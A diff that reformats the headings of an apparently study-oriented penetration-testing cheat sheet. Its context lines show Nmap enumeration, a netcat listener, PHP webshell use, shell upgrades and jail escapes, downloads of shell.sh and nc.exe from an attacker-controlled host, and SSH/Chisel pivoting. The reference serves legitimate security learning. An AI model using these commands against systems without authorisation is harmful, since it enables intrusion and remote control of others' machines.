@@ -1,4 +1,6 @@
-󾠮 General Enumeration - Nmap 🛠
+# 󾠮 General Enumeration - Nmap 🛠
+
+
 Basic Scan
 nmap -sC -sV -p- -oN full_scan.txt <target>
 sC : Runs default scripts
@@ -10,7 +12,8 @@ nmap -A -T4 <target>
 Scan Specific Ports
 nmap -p 21,22,53,80,443,139,445,2049 <target>
 —
-󾠯 Banner Grabbing 🎭
+# 󾠯 Banner Grabbing 🎭
+
 Using Netcat
 nc -nv <target> <port>
 Using Telnet
@@ -18,7 +21,9 @@ telnet <target> <port>
 Using Curl for HTTP Headers
 curl -I http://<target>
 —
-󾠰 Port-Specific Enumeration
+
+
+# 󾠰 Port-Specific Enumeration
 Port 21 - FTP
 nmap --script=ftp-anon -p 21 <target>
 Check for anonymous login:
@@ -47,7 +52,8 @@ snmpwalk -v2c -c public <target>
 Port 2049 - NFS
 showmount -e <target>
 —
-󾠱 Shells & Payloads 🎯
+
+# 󾠱 Shells & Payloads 🎯
 Universal Listeners
 Netcat Listener:
 nc -lvnp 4444
@@ -78,14 +84,16 @@ PHP Webshells
 Upload this file and execute commands like:
 http://target.com/shell.php?cmd=whoami
 —
-󾠲 Upgrading Your Shell - Linux
+
+# 󾠲 Upgrading Your Shell - Linux
 If you get a limited shell, upgrade it to an interactive one:
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 Enable a proper TTY:
 export TERM=xterm-256color
 stty raw -echo; fg
 —
-󾠳 Escaping Jailed Shells
+
+# 󾠳 Escaping Jailed Shells
 Check if restricted shell is active:
 echo $SHELL
 Bypass Limited Shell:
@@ -93,7 +101,8 @@ awk 'BEGIN {system("/bin/bash")}'
 or
 perl -e 'exec "/bin/sh";'
 —
-󾠴 File Transfers 📂
+
+# 󾠴 File Transfers 📂
 Linux - HTTP Server
 Start a Python HTTP server:
 python3 -m http.server 8080
@@ -102,13 +111,13 @@ wget http://<your-ip>:8080/shell.sh
 Windows File Transfer (PowerShell)
 Invoke-WebRequest -Uri "http://<your-ip>/nc.exe" -OutFile "C:\Users\Public\nc.exe"
 —
-󾠵 Port Forwarding & Pivoting
+# 󾠵 Port Forwarding & Pivoting
 Linux
 ssh -L 8080:127.0.0.1:80 user@pivot-host
 Windows (Chisel)
 chisel client <your-ip>:8000 R:8080:127.0.0.1:80
 —
-󾠶 Privilege Escalation 🚀
+# 󾠶 Privilege Escalation 🚀
 Windows Privilege Escalation
 Check for Privileges
 whoami /priv
